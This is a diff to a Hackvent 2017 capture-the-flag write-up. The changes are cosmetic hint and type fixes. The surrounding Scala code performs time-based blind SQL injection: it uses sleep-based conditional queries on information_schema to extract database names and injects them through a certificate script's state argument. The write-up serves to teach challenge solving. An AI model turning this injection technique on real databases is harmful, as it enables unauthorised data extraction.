@@ -14,7 +14,7 @@ Hint #1: The admin is a lazy clicker boy and only likes `<a href="..."></a>`
 Hint #2: As a passionate designer, the admin loves different fonts.  
 Hint #3: For step 2: I'd better be my own CA.  
 Hint #4: For step 2: It's all about the state  
-Hint #5: For step 3: python programmers don't need {{ ninjas }}
+Hint #5: For step 3: Python programmers don't need {{ ninjas }}
 
 ### Solution
 
@@ -138,7 +138,7 @@ val sleep = 3
 /* -- database names extractor -- */
 
 def databaseNameStmtBuilder()(c: Char, pos: Int, offset: Int): String =
-  s"SELECT IF(substr(n,$pos,1)='$c',sleep($sleep),0)FROM(SELECT DISTINCT table_schema n FROM information_schema.tables LIMIT $offset,1)d";
+  s"SELECT IF(substr(n,$pos,1)='$c',sleep($sleep),0)FROM(SELECT DISTINCT table_schema n FROM information_schema.tables LIMIT $offset,1)d"
 
 def extractDatabaseNames(): Seq[String] = extractValues(databaseNameStmtBuilder(), idChars)
 def extractDatabaseName(offset: Int): Option[String] = extractValue(databaseNameStmtBuilder(), idChars, offset)
@@ -207,9 +207,9 @@ def extractValue(builder: (Char, Int, Int) => String, alphabet: Seq[Char], offse
   if (value.nonEmpty) Some(value.toString) else None
 }
 
-def checkSQL(statement: String, sleep: Int) = time(() => generateCert(s"'OR($statement)OR'")) >= sleep
+def checkSQL(statement: String, sleep: Int): Boolean = time(() => generateCert(s"'OR($statement)OR'")) >= sleep
 
-def generateCert(state: String) = {
+def generateCert(state: String): Unit = {
   val retcode = s"hackvent2017/challenges/day24/files/generate-cert.sh $state".!
   if (retcode != 0) throw new RuntimeException(s"Unexpected result code: $retcode")
 }
